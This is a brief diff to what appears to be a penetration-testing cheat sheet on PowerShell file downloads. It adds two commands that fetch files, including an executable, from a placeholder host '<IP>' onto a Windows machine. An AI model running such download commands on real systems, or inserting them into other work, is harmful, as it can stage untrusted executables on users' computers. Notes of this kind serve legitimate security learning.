@@ -13,8 +13,10 @@ Valid PowerShell cmdlets/methods that can be used to download files:
 - Invoke-RestMethod
 
 
-
-
+```
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<IP>/file.exe','C:\Users\user\Desktop\file.exe')"
+iwr -uri http://<IP>/file -Outfile file
+```
 
 
 
